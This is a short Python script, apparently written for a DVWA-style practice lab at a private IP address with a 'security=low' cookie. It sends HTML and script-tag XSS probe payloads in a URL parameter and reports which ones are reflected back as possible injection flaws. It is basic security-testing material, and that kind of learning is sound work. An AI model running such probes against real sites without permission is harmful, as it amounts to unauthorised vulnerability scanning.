import requests
# html ınjection
header={"Cookie": "security=low; PHPSESSID=34127381273dsajdjaslkdas812730812dasjdnajlksndjkla"}
xss_list=["siber","<h1>siber","<script>alert('siber')</script>"]
for payload in xss_list:
    print(payload)
    url = "http://192.168.1.41/dizin/dizin/?name="+str(payload)
    sonuc = requests.get(url=url, headers=header)
    if str(payload) in str(sonuc.content):
        print("Muhtemel bir html injection açığı: ",str(payload))